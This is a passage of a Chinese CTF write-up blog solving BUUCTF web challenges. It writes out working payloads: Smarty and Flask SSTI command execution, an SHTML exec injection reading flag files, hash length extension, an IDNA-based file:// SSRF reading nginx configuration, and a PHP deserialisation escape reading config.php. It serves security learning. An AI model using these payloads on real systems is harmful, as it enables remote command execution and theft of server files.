---
title: buuctf_web部分刷题记录_PART2
abbrlink: 4f3ccb8a
date: 2022-10-22 21:19:16
description: 我是菜鸡
cover: false
tags:
  - CTF-Web
categories:
  - CTF
  - Web安全
  - 刷题
typora-root-url: ..
---

# [smarty-SSTI]Web11

要素察觉?![image-20221022212305508](/images/buuctf-web2/image-20221022212305508.png)

根据网站上的提示,加`XFF`头,其内容会直接回显在网页上

<img src="/images/buuctf-web2/image-20221022212644603.png" alt="image-20221022212644603" style="zoom:67%;" />

确信是`smarty`的`SSTI`了:

<img src="/images/buuctf-web2/image-20221022212811607.png" alt="image-20221022212811607" style="zoom:67%;" />

```
X-Forwarded-For: {$smarty.version}   查看smarty版本
3.1.30
```

```
X-Forwarded-For: {if system("ls /")}{/if} 执行系统命令
```

<img src="/images/buuctf-web2/image-20221022213108197.png" alt="image-20221022213108197" style="zoom:67%;" />



```
X-Forwarded-For: {if system("cat /flag")}{/if}
```

![image-20221022213204740](/images/buuctf-web2/image-20221022213204740.png)



<br>

***

<br>

# [哈希长度扩展攻击]SSRF Me



这题给了提示,`flag`在`./flag.txt`中

```python
#! /usr/bin/env python
#encoding=utf-8
from flask import Flask
from flask import request
import socket
import hashlib
import urllib
import sys
import os
import json

reload(sys)
sys.setdefaultencoding('latin1')
app = Flask(__name__)
secert_key = os.urandom(16)

class Task:
    def __init__(self, action, param, sign, ip):
        self.action = action
        self.param = param
        self.sign = sign
        self.sandbox = md5(ip)
        if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr
            os.mkdir(self.sandbox)

    def Exec(self):
        result = {}
        result['code'] = 500
        if (self.checkSign()):
            if "scan" in self.action:
                tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
                resp = scan(self.param)
                if (resp == "Connection Timeout"):
                    result['data'] = resp
                else:
                    print resp
                    tmpfile.write(resp)
                    tmpfile.close()
                result['code'] = 200
            if "read" in self.action:
                f = open("./%s/result.txt" % self.sandbox, 'r')
                result['code'] = 200
                result['data'] = f.read()
            if result['code'] == 500:
                result['data'] = "Action Error"
        else:
            result['code'] = 500
            result['msg'] = "Sign Error"
        return result

    def checkSign(self):
        if (getSign(self.action, self.param) == self.sign):
            return True
        else:
            return False

#generate Sign For Action Scan.
@app.route("/geneSign", methods=['GET', 'POST'])
def geneSign():
    param = urllib.unquote(request.args.get("param", "")) # 获得GET中传的参数"param"
    action = "scan"
    return getSign(action, param)

# 从这里开始
@app.route('/De1ta',methods=['GET','POST'])
def challenge():
    action = urllib.unquote(request.cookies.get("action"))# 获得cookie中的参数"action"
    param = urllib.unquote(request.args.get("param", ""))# 获得GET中传的参数"param"
    sign = urllib.unquote(request.cookies.get("sign"))# 获得cookie中的参数"sign"
    ip = request.remote_addr
    if(waf(param)): # 对GET中传的参数"param"进行过滤
        return "No Hacker!!!!"
    task = Task(action, param, sign, ip) # 创建一个新的对象
    return json.dumps(task.Exec()) # 对param进行扫描,并返回结果
@app.route('/')
def index():
    return open("code.txt","r").read()

def scan(param):
    socket.setdefaulttimeout(1)
    try:
        return urllib.urlopen(param).read()[:50]
    except:
        return "Connection Timeout"

def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()

def md5(content):
    return hashlib.md5(content).hexdigest()

def waf(param):
    check=param.strip().lower()
    if check.startswith("gopher") or check.startswith("file"):
        return True
    else:
        return False

if __name__ == '__main__':
    app.debug = False
    app.run(host='0.0.0.0')

```

`sign`=  系统随机生成的`secret_key`值 + 用户输入的`param`(要读取的文件) + `action`    一起进行md5计算



直接访问`/geneSign`,输出了一段`sign`值:

```
591f154875e114faeb2e2388f71e6919
```

访问`/geneSign`,`param`传`flag.txt`:

```
/geneSign?param=flag.txt
输出:d4bd0b631614327be0367efa305057e5
```

访问`/De1ta`时, 73行创建一个新的`task`对象,此时 `self.sign`来自请求`/De1ta`时 `cookie`中的值,**这个值需要我们自己抓包添加**

然后`checkSign`的另一个`Sign`通过`getSign`来获得, 通过了检测才能往下进行

也就是说`Cookie`中的`sign`值, 必须等于由`secret_key` +` param` + `action`  计算出来的`sign`值才行

那么如果`param=flag.txt`,那在`cookie`中添加我们前面访问`/geneSign`得到的那个值就行,然后`cookie`中的`action`传`scan`

可利用点应该在82行`return urllib.urlopen(param).read()[:50]`,添加上面的参数并访问`/De1ta`时,服务器通过检测就会去读取`param`的内容



![image-20221023101155575](/images/buuctf-web2/image-20221023101155575.png)

读取成功,但现在问题是如何将`action`改为`read`来获得读取结果

(61行`action`的值是固定为`scan`的,所以我们访问`/geneSign`无法获得`action=read`时的`sign`值)

注意到代码中对执行`scan`还是`read`进行检测时,用的是 `if xx in action` 不是严格地去查询`action`的值是否等于某一项

那么如果访问`/De1ta`时将`action`设置为: `scanread` ,只要通过了`sign`的检测,就可以执行`read`

利用`getsign`中字符串拼接的特性,可以获得这个`sign`

```
/geneSign?param=flag.txtread
c43782860279626e3bdd009573349473
=md5(secert_key +"flag.txtread"+"scan")=md5(secert_key +"flag.txtreadscan")=md5(secert_key +"flag.txt"+"readscan")
```

将这个值添加进去就能够读取到`flag`了

![image-20221023104440712](/images/buuctf-web2/image-20221023104440712.png)

这里还可以通过`hashpump`工具进行哈希长度扩展攻击:

>如果一个应用程序是这样操作的：
>
>1. 准备了一个密文和一些数据构造成一个字符串，并且使用了MD5之类的哈希函数生成了一个哈希值（也就是所谓的signature/签名）
>2. 让攻击者可以提交数据以及哈希值，虽然攻击者不知道密文
>3. 服务器把提交的数据跟密文构造成字符串，并经过哈希后判断是否等同于提交上来的哈希值
>
>这个时候，该应用程序就易受长度扩展攻击，攻击者可以构造出`{secret || data || attacker_controlled_data}`的哈希值*。*

例如本题中的密文就是`secret_key`

目前掌握的的是`md5(secret_key+ "flag.txtscan")`的值,那么我们可以通过工具获得`md5(secret_key+ flag.txtscan+read)`的值

这样如果再从`action`中传 `scanread` 就可以成功执行`read`功能了

```
kali㉿kali)-[~/Desktop/HashPump]
└─$ hashpump   
Input Signature: d4bd0b631614327be0367efa305057e5
Input Data: flag.txtscan  (本来追加在secret_key后面的已知数据)
Input Key Length: 16  (secret_key的长度)
Input Data to Add: read  (为了计算新的sign值,我们希望添加的新数据)
aeccfcf28d2da89a3c8581a6c90d1842  (计算结果,新的sign值)
flag.txtscan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read  (新的secret_key后面的已知数据)

```



<br>

***

<br>

# [简单]Futurella

这啥...  除了下面这个看起来有点像flag

<img src="/images/buuctf-web2/image-20221023155639056.png" alt="image-20221023155639056" style="zoom:67%;" />



查看源码直接出flag.......

<br>

***

<br>

# [idna规范化字符,nginx配置文件,urlparse]Pythonginx

```python
@app.route('/getUrl', methods=['GET', 'POST'])
def getUrl():
    url = request.args.get("url")
    host = parse.urlparse(url).hostname # 获取域名
    if host == 'suctf.cc':
        return "我扌 your problem? 111"
    
    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc': 
        return "我扌 your problem? 222 " + host
# 前面两次检测host中有没有 suctf.cc
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))  # 这一句用于处理非ascii字符,将其规范化成ascii字符
    parts[1] = '.'.join(newhost)  # 将host的按照.分割开之后,各自编码再用.连接起来
    
    #去掉 url 中的空格
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    
    if host == 'suctf.cc':
        return urllib.request.urlopen(finalUrl).read()
    else:
        return "我扌 your problem? 333"
```



这里先从最后的23行打开url并读取内容处入手, 这里可以通过在`url`范畴中的`file://`协议来读取本地文件,但前提是这里我们给的`url`中必须包含`suctf.cc`,且不能在前面被检测出来



关于URL: 完整格式为:

```
scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]
协议://用户:密码@主机host:端口/路径path#片段
```

所以,在`"https://username:password@www.baidu.com:80/index.html;parameters?name=tom#example"` 中:

**`host`部分就是`www.baidu.com`**

关于`urllib.parse.urlparse`和`urllib.parse.urlsplit`   **都是解析url的,前者粒度更细:**

`urllib.parse.urlparse`解析后的结果中包含:

| 属性       | 索引 | 值                               | 值（如果不存在）                                             |
| :--------- | :--- | :------------------------------- | :----------------------------------------------------------- |
| `scheme`   | 0    | URL 协议说明符                   | *scheme* 参数                                                |
| `netloc`   | 1    | 网络位置部分                     | 空字符串                                                     |
| `path`     | 2    | 分层路径                         | 空字符串                                                     |
| `params`   | 3    | Parameters for last path element | 空字符串                                                     |
| `query`    | 4    | 查询组件                         | 空字符串                                                     |
| `fragment` | 5    | 片段标识符                       | 空字符串                                                     |
| `username` |      | 用户名                           | [`None`](https://docs.python.org/zh-cn/3/library/constants.html#None) |
| `password` |      | 密码                             | [`None`](https://docs.python.org/zh-cn/3/library/constants.html#None) |
| `hostname` |      | 主机名（小写）                   | [`None`](https://docs.python.org/zh-cn/3/library/constants.html#None) |
| `port`     |      | 端口号为整数（如果存在）         | [`None`](https://docs.python.org/zh-cn/3/library/constants.html#None) |

```python
from urllib.parse import urlsplit, urlparse
url = "https://username:password@www.baidu.com:80/index.html;parameters?name=tom#example"
print(urlsplit(url))
"""
SplitResult(
    scheme='https', 
    netloc='username:password@www.baidu.com:80', 
    path='/index.html;parameters', 
    query='name=tom', 
    fragment='example')
"""

print(urlparse(url))
"""
ParseResult(
    scheme='https', 
    netloc='username:password@www.baidu.com:80', 
    path='/index.html', 
    params='parameters', 
    query='name=tom', 
    fragment='example'
)
"""
```



所以上面如果要使用`file://`来读取文件, 要保证`host`部分是`suctf.cc`, 则url的格式就需要是:

```
file://suctf.cc/path   这里path是本地文件的具体路径
```

但这里还需要绕过前面对`suctf.cc`的过滤,因为`newhost.append(h.encode('idna').decode('utf-8'))`这一句的规范化在前两次检测后面, 所以可以将`suctf.cc`中的字符换成其他`unicode`字符来绕过前面的检测, 而这些特殊字符会在规范化时被替换成正确的字符,从而通过最后一次检测成功读取文件,例如

```
file://suctf.cᶜ/
输出:
我扌 your problem? 333
```

这里爆了333错误,说明已经通过了过滤,现在需要考虑读取哪些文件

源码里提示了`nginx`,那么读取一下`nginx`的配置文件试试

可能的路径:

```
/etc/nginx/nginx.conf
/usr/local/nginx/conf/nginx.conf
```

但尝试了:

```
file://suctf.cᶜ/usr/local/nginx/conf/nginx.conf
file://suctf.cᶜ/etc/nginx/nginx.conf
都会爆 333 错误, 说明ᶜ没有成功被规范化处理,系统仍然认为它和c是不同的两个字符
```

那么再换一个其他的字符:

```
file://suctf.cⅽ/usr/local/nginx/conf/nginx.conf
读取成功: 得到了flag的路径
server {
    listen 80;
    location / {
        try_files $uri @app;
    }
    location @app {
        include uwsgi_params;
        uwsgi_pass unix:///tmp/uwsgi.sock;
    }
    location /static {
        alias /app/static;
    }
    # location /flag {
    #     alias /usr/fffffflag;
    # }
}
```

接下来读取flag文件就可以了:

```
getUrl?url=file://suctf.cⅽ/usr/fffffflag
```

<br>

***

<br>



# [md5爆破,vim泄露,shtml执行命令]EasySearch

存在`vim泄露`访问 `index.php.swp`获得源码:

```php
<?php
	ob_start();
	function get_hash(){
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-'; #共73个字符
		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times   随机选5个字符拼接成字符串
		$content = uniqid().$random; // 生成一个唯一id,后面拼接上刚刚获得的长度为5的随机字符串
		return sha1($content); 
	}
    header("Content-Type: text/html;charset=utf-8");
	***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) { //密码md5值的前6位需要是'6d0bc1'才能正常登录
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1> // 这里username可以拿来执行命令
            ***
			***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
			echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";
            
    }else
    {
	***
    }
	***
?>
```

密码`md5`值的前6位需要是`6d0bc1`才能正常登录,那么首先需要爆破一下符合这样条件的字符串:

```python
from hashlib import md5
import itertools

chars = [chr(i) for i in range(32,128)]

for s in itertools.product(chars, repeat=4):
    # 此迭代器product可以叠加笛卡尔积,repeat设为4,也就是chars中字符的任意4位组合
    m = "".join(s)
    if md5(m.encode()).hexdigest()[:6] == '6d0bc1':
        print(m)
# 学到了,利用itertools.product来迭代任意组合,只用for的话需要嵌套才能做到

#执行结果:
 Rbl
RhPd
d`H6
kX!}
```

使用爆破出来的密码成功登录, 这里响应头中提示了我们url

![image-20221023181519105](/images/buuctf-web2/image-20221023181519105.png)

尝试利用`username`来向目标文件写入一句话木马,然后按照提示的路径访问并执行命令, 但是没有成功

<img src="/images/buuctf-web2/image-20221023182531101.png" alt="image-20221023182531101" style="zoom:67%;" />

**新知识点: `shtml`文件可以执行系统命令, 格式为:**

```
<!--#exec Cmd="命令"-->
```

那么:

```
username=<!--#exec Cmd="ls /"-->&password=RhPd
返回路径:public/ee9c0aaa3117e3ddba01d553acd4d3bb279b6ba0.shtml
```

访问这个路径,成功回显了执行结果:

<img src="/images/buuctf-web2/image-20221023183046479.png" alt="image-20221023183046479" style="zoom:67%;" />

找一下flag:

```
username=<!--#exec Cmd="ls /var/www/html"-->&password=RhPd
Url_is_here: public/91d348bdde783b66958a00e16e2d24690dddb6d1.shtml
```

<img src="/images/buuctf-web2/image-20221023183312510.png" alt="image-20221023183312510" style="zoom:67%;" />

获得flag:

```
username=<!--#exec Cmd="cat /var/www/html/flag_990c66bf85a09c664f0b6741840499b2"-->&password=RhPd
Url_is_here: public/ed4a75977a0eb529d431e7d8ece70454361578b5.shtml
```



<br>

***

<br>

# [cookie]Kookie

![image-20221023191627611](/images/buuctf-web2/image-20221023191627611.png)

根据提示,使用 cookie/monster 来登录

```
?action=login&username=cookie&password=monster
```

![image-20221023191708409](/images/buuctf-web2/image-20221023191708409.png)

登录之后根据响应中的提示, 加上个cookie字段:

![image-20221023191815424](/images/buuctf-web2/image-20221023191815424.png)





<br>

***

<br>

# [长度增加的反序列化字符串逃逸,www.zip]piapiapia

上来又是用户名和密码的输入框,试了半天也没找到注入点

扫一下网站目录:

```
py dirsearch.py -u "http://36244f13-8785-4f24-85c0-9a40803e9231.node4.buuoj.cn:81/" --delay=2
```

![image-20221023194716766](/images/buuctf-web2/image-20221023194716766.png)

访问`/www.zip`下载到源码备份

`index.php`:

```php
<?php
	require_once('class.php');
	if($_SESSION['username']) {
		header('Location: profile.php');
		exit;
	}
	if($_POST['username'] && $_POST['password']) {
		$username = $_POST['username'];
		$password = $_POST['password'];

		if(strlen($username) < 3 or strlen($username) > 16) 
			die('Invalid user name');

		if(strlen($password) < 3 or strlen($password) > 16) 
			die('Invalid password');

		if($user->login($username, $password)) {
			$_SESSION['username'] = $username;
			header('Location: profile.php');
			exit;	
		}
		else {
			die('Invalid user name or password');
		}
	}
	else {
?>
```

`profile.php`

```php
<?php
	require_once('class.php');
	if($_SESSION['username'] == null) {
		die('Login First');	
	}
	$username = $_SESSION['username'];
	$profile=$user->show_profile($username);
	if($profile  == null) {
		header('Location: update.php');
	}
	else {
		$profile = unserialize($profile); # 反序列化, profile来自$user->show_profile($username);
		$phone = $profile['phone'];
		$email = $profile['email'];
		$nickname = $profile['nickname'];
		$photo = base64_encode(file_get_contents($profile['photo'])); # 读取文件
?>
```

`class.php`:

```php
<?php
require('config.php');

class user extends mysql{
	private $table = 'users';

	public function is_exists($username) {
		$username = parent::filter($username);

		$where = "username = '$username'";
		return parent::select($this->table, $where);
	}
	public function register($username, $password) {
		$username = parent::filter($username);
		$password = parent::filter($password);

		$key_list = Array('username', 'password');
		$value_list = Array($username, md5($password));
		return parent::insert($this->table, $key_list, $value_list);
	}
	public function login($username, $password) {
		$username = parent::filter($username);
		$password = parent::filter($password);

		$where = "username = '$username'";
		$object = parent::select($this->table, $where);
		if ($object && $object->password === md5($password)) {
			return true;
		} else {
			return false;
		}
	}
	public function show_profile($username) {
		$username = parent::filter($username); # 对用户名进行过滤

		$where = "username = '$username'"; # 用来拼接sql查询语句,根据去查一个用户来查询相关信息
		$object = parent::select($this->table, $where); #第67行
		return $object->profile;
	} //select * from $this->table where username='$username'
	public function update_profile($username, $new_profile) {
		$username = parent::filter($username);
		$new_profile = parent::filter($new_profile);

		$where = "username = '$username'";
		return parent::update($this->table, 'profile', $new_profile, $where);
	} 
	public function __tostring() {
		return __class__;
	}
}

class mysql {
	private $link = null;

	public function connect($config) {
		$this->link = mysql_connect(
			$config['hostname'],
			$config['username'], 
			$config['password']
		);
		mysql_select_db($config['database']);
		mysql_query("SET sql_mode='strict_all_tables'");

		return $this->link;
	}

	public function select($table, $where, $ret = '*') {
		$sql = "SELECT $ret FROM $table WHERE $where";
		$result = mysql_query($sql, $this->link);
		return mysql_fetch_object($result);
	}

	public function insert($table, $key_list, $value_list) {
		$key = implode(',', $key_list);
		$value = '\'' . implode('\',\'', $value_list) . '\''; 
		$sql = "INSERT INTO $table ($key) VALUES ($value)";
		return mysql_query($sql);
	}

	public function update($table, $key, $value, $where) {
		$sql = "UPDATE $table SET $key = '$value' WHERE $where";
		return mysql_query($sql);
	}

	public function filter($string) {
		$escape = array('\'', '\\\\');
		$escape = '/' . implode('|', $escape) . '/';
		$string = preg_replace($escape, '_', $string);

		$safe = array('select', 'insert', 'update', 'delete', 'where');
		$safe = '/' . implode('|', $safe) . '/i'; # 构造正则匹配表达式
		return preg_replace($safe, 'hacker', $string);
	}
	public function __tostring() {
		return __class__;
	}
}
session_start();
$user = new user();
$user->connect($config);
```

`update.php`:

```php
<?php
	require_once('class.php');
	if($_SESSION['username'] == null) {
		die('Login First');	
	}
	if($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {

		$username = $_SESSION['username'];
		if(!preg_match('/^\d{11}$/', $_POST['phone']))
			die('Invalid phone');

		if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))
			die('Invalid email');
		
		if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
			die('Invalid nickname');

		$file = $_FILES['photo'];
		if($file['size'] < 5 or $file['size'] > 1000000)
			die('Photo size error');

		move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));
		$profile['phone'] = $_POST['phone'];
		$profile['email'] = $_POST['email'];
		$profile['nickname'] = $_POST['nickname'];
		$profile['photo'] = 'upload/' . md5($file['name']);

		$user->update_profile($username, serialize($profile));
		echo 'Update Profile Success!<a href="profile.php">Your Profile</a>';
	}
	else {
?>
```

捋一下可利用的点和逻辑:

```
update.php中: 输入要修改的信息后, 形成数组$profile
将$profile序列化处理为字符串,然后执行user类中的 update_profile 方法
在执行时update_profile, $username 和 序列化的$profile 都需要经过 fileter的过滤:
('select', 'insert', 'update', 'delete', 'where') 都会被替换为 'hacker' (其中where被替换为hacker时字符串长度+1,这里想到了反序列化的字符串逃逸)

过滤完之后, 在update_profile中执行父类mysql中的update方法,执行的sql语句为:
"UPDATE users(表名) SET profile = "序列化且经过处理的profile字符串的值" WHERE username=$username";
将更新完的信息以序列化字符串的形式存入数据库users表

现在定位到反序列化函数处profile.php中:

	$username = $_SESSION['username'];
	$profile=$user->show_profile($username);
	if($profile  == null) {
		header('Location: update.php');
	}
	else {
		$profile = unserialize($profile); # 反序列化, profile来自$user->show_profile($username);
		$phone = $profile['phone'];
		$email = $profile['email'];
		$nickname = $profile['nickname'];
		$photo = base64_encode(file_get_contents($profile['photo'])); # 读取文件
		
		
首先通过user类的show_profile函数,通过用户名从数据库中查询并取出对应的序列化字符串
对其进行反序列化,拆解为数组,包括$profile['phone'];$profile['email'];$profile['nickname'];$profile['photo']
其中会根据$profile['photo']的值去读取文件, 利用点在这里
正常情况下,这个值来自于上传文件的文件名,不容易控制, 现在可以通过反序列化的字符串逃逸将这个值覆盖为我们希望读取的文件的文件名
```

那么现在需要构造反序列化的字符串:

```
a:4:{s:5:"phone";s:11:"13333333333";s:5:"email";s:11:"abc@123.com";s:8:"nickname";s:1:"a";s:5:"photo";s:39:"upload/394659692a460258b45a99f1424ea357";}
a:4:{s:5:"phone";s:11:"13333333333";s:5:"email";s:11:"abc@123.com";s:8:"nickname";s:1:"a";s:5:"photo";s:39:"upload/394659692a460258b45a99f1424ea357";}
array(4) { ["phone"]=> string(11) "13333333333" ["email"]=> string(11) "abc@123.com" ["nickname"]=> string(1) "a" ["photo"]=> string(39) "upload/394659692a460258b45a99f1424ea357" }
array(4) { ["phone"]=> string(11) "13333333333" ["email"]=> string(11) "abc@123.com" ["nickname"]=> string(1) "a" ["photo"]=> string(39) "upload/394659692a460258b45a99f1424ea357" }
```

现在还有一个问题,就是我们用来构造逃逸字符串的`nickname`有长度限制:

对`nickname`的长度限制使用数组来绕过 : `nickname[]=xxxxxxxxxxxxxxx` 这样以来检测其长度是会默认为1

![image-20221023224746419](/images/buuctf-web2/image-20221023224746419.png)

下面开始构建字符串: (脚本在最后面)

```
$profile['nickname'][] = ";}s:5:"photo";s:11:"profile.php";}
假设我们要读取 profile.php

序列化成字符串,过滤前
a:4:{s:5:"phone";s:11:"13333333333";s:5:"email";s:11:"abc@123.com";s:8:"nickname";a:1:{i:0;s:35:"";}s:5:"photo";s:11:"profile.php";}";}s:5:"photo";s:39:"upload/394659692a460258b45a99f1424ea357";}
过滤后的字符串
a:4:{s:5:"phone";s:11:"13333333333";s:5:"email";s:11:"abc@123.com";s:8:"nickname";a:1:{i:0;s:35:"";}s:5:"photo";s:11:"profile.php";}";}s:5:"photo";s:39:"upload/394659692a460258b45a99f1424ea357";}
过滤前字符串反序列化
array(4) { ["phone"]=> string(11) "13333333333" ["email"]=> string(11) "abc@123.com" ["nickname"]=> array(1) { [0]=> string(35) "";}s:5:"photo";s:11:"profile.php";}" } ["photo"]=> string(39) "upload/394659692a460258b45a99f1424ea357" }
过滤后字符串反序列化
array(4) { ["phone"]=> string(11) "13333333333" ["email"]=> string(11) "abc@123.com" ["nickname"]=> array(1) { [0]=> string(35) "";}s:5:"photo";s:11:"profile.php";}" } ["photo"]=> string(39) "upload/394659692a460258b45a99f1424ea357" }
```

接下来利用过滤`where`时将其替换成`hacker`使其长度+1的性质来构造逃逸字符串

```
$profile['nickname'][] = wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:11:"profile.php";}
(35个where)
替换前: 35*where(5) + 35(从where后的引号开始数至末尾)
替换后: 35*hacker(6)

序列化成字符串,过滤前
a:4:{s:5:"phone";s:11:"13333333333";s:5:"email";s:11:"abc@123.com";s:8:"nickname";a:1:{i:0;s:210:"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:11:"profile.php";}";}s:5:"photo";s:39:"upload/394659692a460258b45a99f1424ea357";}
过滤后的字符串
a:4:{s:5:"phone";s:11:"13333333333";s:5:"email";s:11:"abc@123.com";s:8:"nickname";a:1:{i:0;s:210:"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";}s:5:"photo";s:11:"profile.php";}";}s:5:"photo";s:39:"upload/394659692a460258b45a99f1424ea357";}
过滤前字符串反序列化
array(4) { ["phone"]=> string(11) "13333333333" ["email"]=> string(11) "abc@123.com" ["nickname"]=> array(1) { [0]=> string(210) "wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:11:"profile.php";}" } ["photo"]=> string(39) "upload/394659692a460258b45a99f1424ea357" }
过滤后字符串反序列化, 可以看到这里成功逃逸了
array(4) { ["phone"]=> string(11) "13333333333" ["email"]=> string(11) "abc@123.com" ["nickname"]=> array(1) { [0]=> string(210) "hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker" } ["photo"]=> string(11) "profile.php" }
成功
```

多读取几个文件试试(注意在修改读取的文件名时,其长度的值也要改, `where`的数量也要改,长度+1,`where`的数量就要+1)

<img src="/images/buuctf-web2/image-20221023234449637.png" alt="image-20221023234449637" style="zoom:67%;" />

读取完成后需要去 `profile.php`中查看源码,然后将读取到的`base64编码`解码

最后在`config.php`中找到flag

测试脚本:

```php
<?php
$file['name'] = 'a.jpg';
$profile['phone'] = "13333333333";
$profile['email'] = "abc@123.com";
$profile['nickname'][] = "wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";}s:5:\"photo\";s:10:\"config.php\";}";
$profile['photo'] = 'upload/' . md5($file['name']);

function filter($string){
    $escape = array('\'', '\\\\');
    $escape = '/' . implode('|', $escape) . '/';
	$string = preg_replace($escape, '_', $string);
    $safe = array('select', 'insert', 'update', 'delete', 'where');
    $safe = '/' . implode('|', $safe) . '/i'; # 构造正则匹配表达式
    return preg_replace($safe, 'hacker', $string);
}

$a = serialize($profile);
echo $a;
echo '<br>';
$b = filter($a);
echo $b;
echo '<br>';
$c = unserialize($a);
$d = unserialize($b);
var_dump($c);
echo '<br>';
var_dump($d);

?>
```

<br>

***

<br>

# [SSTI,Flask的pin]FlaskApp

`base64`解码页面随便输入点东西,无法解码时会爆错, 报出一些路径和源码

<img src="/images/buuctf-web2/image-20221024151141347.png" alt="image-20221024151141347" style="zoom:67%;" />

尝试旁边的打开shell选项,提示需要输入PIN码来解锁<img src="/images/buuctf-web2/image-20221024151516929.png" alt="image-20221024151516929" style="zoom:67%;" />

```
 You can find the PIN printed out on the standard output of your shell that runs the server. 
```

随便输入PIN并抓个包:

<img src="/images/buuctf-web2/image-20221024151744306.png" alt="image-20221024151744306" style="zoom:67%;" />

下拉菜单还能打开:

```python
@app.route('/decode',methods=['POST','GET'])
def decode():
    if request.values.get('text') :
        text = request.values.get("text") # 通过post来传的text
        text_decode = base64.b64decode(text.encode())
        tmp = "结果 ： {0}".format(text_decode.decode())
        if waf(tmp) : # 有过滤
            flash("no no no !!")
            return redirect(url_for('decode'))
			res =  render_template_string(tmp) # render函数,存在SSTI
```

那么现在在解密页面输入一些SSTI的payload试试:

```
输入: e3s3Kjd9fQ==   {{7*7}}
输出: nonono 

输入: e3s3Kzd9fQ==  {{7+7}}
输出 14
说明 存在对*的过滤

输入: e3tjb25maWd9fQ==  {{config}}
输出:
 &lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: True, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: &#39;s_e_c_r_e_t_k_e_y&#39;, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(days=31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: False, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: datetime.timedelta(seconds=43200), &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;JSONIFY_MIMETYPE&#39;: &#39;application/json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093, &#39;BOOTSTRAP_USE_MINIFIED&#39;: True, &#39;BOOTSTRAP_CDN_FORCE_SSL&#39;: False, &#39;BOOTSTRAP_QUERYSTRING_REVVING&#39;: True, &#39;BOOTSTRAP_SERVE_LOCAL&#39;: False, &#39;BOOTSTRAP_LOCAL_SUBDOMAIN&#39;: None}&gt;
 
SECRET_KEY: s_e_c_r_e_t_k_e_y
```

这里拿爆出来的`SECRET_KEY`使用脚本解密了几个`session`,并没有得到什么有价值的信息:

![image-20221024160704060](/images/buuctf-web2/image-20221024160704060.png)



继续试试payload:

```
{% for x in ().__class__.__base__.__subclasses__() %}
{% if "warning" in x.__name__ %}
{{x.__init__.__globals__['__builtins__']['__import__']('os').__dict__['popen']('ls /').read() }}
{%endif%}
{%endfor%}
执行时会爆nonono, 使用字符串拼接的方法一个一个排除关键词:
